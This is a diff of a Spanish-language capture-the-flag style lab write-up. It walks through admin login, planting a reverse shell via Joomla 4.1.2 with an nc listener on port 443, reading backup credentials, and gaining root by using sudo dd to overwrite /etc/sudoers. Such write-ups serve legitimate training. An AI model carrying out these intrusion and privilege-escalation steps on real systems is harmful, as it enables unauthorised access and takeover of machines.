@@ -70,5 +70,30 @@ sanluis12345
 
 Se ingresa de nuevo al panel administrator y se prueba el texto desencriptado, que tiene logica de ser contrasena
 Se accede exitosamente en la pagina como administrador 
-Despues de navegar por la pagina, al ver la informacion del sitio veo que hay un joomla en la v4.1.2 que investigando se puede eviar una reverseshell editando el archivo index.txt con una reverseshell en la misma pagina
-Al ejecutar cat /etc/passwd encuentro usuarios y entre ellos esta luisillo
+Despues de navegar por la pagina, al ver la informacion del sitio veo que hay un joomla en la v4.1.2 que investigando se puede eviar una reverseshell editando el archivo index.html y escuchando en el puerto 443
+Se hace un tratamiento con script -c bash /dev/null para una consola interactiva y se escriben los siguientes comandos para adentrarnos a la consola
+stty raw -echo;fg
+[1]  + continued  nc -lvnp 443
+<set xtermwww-data@f558d5db82a1:/$ export TERM=xterm
+Para despues entrar como www-data y realizar un ls y navego hasta /var/backups/hidden$ cat otro_caramelo.txt para encontrar un archivo.txt con las credenciales del usuario luisillo
+Para probar si es necsario un archivo para root realizo un ls -l y muestra lo siguiente
+uisillo@0a856f41c56b:/var/backups/hidden$ sudo -l
+Matching Defaults entries for luisillo on 0a856f41c56b:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User luisillo may run the following commands on 0a856f41c56b:
+    (ALL) NOPASSWD: /bin/dd
+
+Busco en la plataforma GTFOBins sobre archivos dd y encuentro para sudousers lo siguiente
+LFILE=file_to_write
+echo "DATA" | dd of=$LFILE
+
+y complementando el comando con el usuario Luisillo
+cd ~
+echo "luisillo ALL=(ALL:ALL) ALL" | sudo dd of=/etc/sudoers
+y escribiendo la contrasena por fin se accede como root
+luisillo@0a856f41c56b:~$ sudo su
+[sudo] password for luisillo: 
+root@0a856f41c56b:/home/luisillo# 
